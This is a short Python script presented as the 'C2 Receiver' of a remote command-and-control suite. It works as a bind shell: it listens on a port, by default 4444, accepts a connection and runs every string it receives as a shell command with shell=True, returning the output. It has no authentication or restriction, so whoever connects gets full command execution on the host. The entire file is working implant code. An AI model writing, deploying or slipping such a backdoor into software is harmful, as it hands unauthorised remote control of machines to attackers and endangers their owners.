import sys
import socket
import subprocess
import shlex
import os
import argparse

def main():
    # command line arguments
    parser = argparse.ArgumentParser(prog="C2 Receiver", description="Receiver for Remote Command and Control Suite")
    parser.add_argument("address", nargs='?', default='127.0.0.1', help="IP Address of this machine (default: %(default)s)")
    parser.add_argument("port", nargs='?', type=int, default=4444, help="Port to listen on (default: %(default)s)")
    args = parser.parse_args()

    # Create a socket object
    server_socket = socket.socket()
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Bind the socket to the host and port
    server_socket.bind((args.address, args.port))

    # Listen for incoming connections
    server_socket.listen(1)
    print("Server listening on {}:{}".format(args.address, args.port))
    
    # wait for first connection
    client_socket, client_address = server_socket.accept()

    while True:
        # receive data
        received_data = client_socket.recv(4096)
        if len(received_data) > 0:

            received_message = received_data.decode()

            # print("message :", received_message)
            
            args = shlex.split(received_message)
            # print(args)

            # special case because cd is a shell built-in
            if args[0] == 'cd':
                os.chdir(args[1])
                client_socket.send("[*] Changed current directory to {}\n".format(os.getcwd()).encode())
            else:
                # proc = subprocess.run(args, capture_output=True, text=True)
                proc = subprocess.check_output(args, stderr=subprocess.STDOUT, shell=True)

                if len(proc) > 0:
                    client_socket.sendall(proc)
                else:
                    client_socket.send("[*] Executed successfully\n".encode())
        else:
            # if no data was received, or if the client closed the connection,
            # reset the socket
            client_socket.close()
            client_socket, client_address = server_socket.accept()

        sys.stdout.flush()

if __name__ == "__main__":
    main()
